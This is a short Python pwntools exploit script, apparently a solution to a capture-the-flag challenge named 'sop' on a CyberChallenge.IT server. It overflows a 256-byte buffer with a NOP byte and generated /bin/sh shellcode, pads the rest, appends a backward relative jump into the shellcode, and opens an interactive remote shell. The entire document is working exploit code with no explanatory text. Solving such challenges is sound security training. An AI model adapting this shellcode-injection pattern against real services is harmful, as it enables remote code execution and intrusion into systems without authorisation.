from pwn import *
elf=ELF("sop")
context.arch="i386"
offset=256

r=remote("sop.challs.cyberchallenge.it", 9247)
shellcode=b"\x90"+asm(shellcraft.sh())


payload=shellcode
payload+=b"A"*(offset-len(shellcode))
payload+=b"\xE9\xFC\xFE\xFF\xFF"

r.sendline(payload)
r.interactive()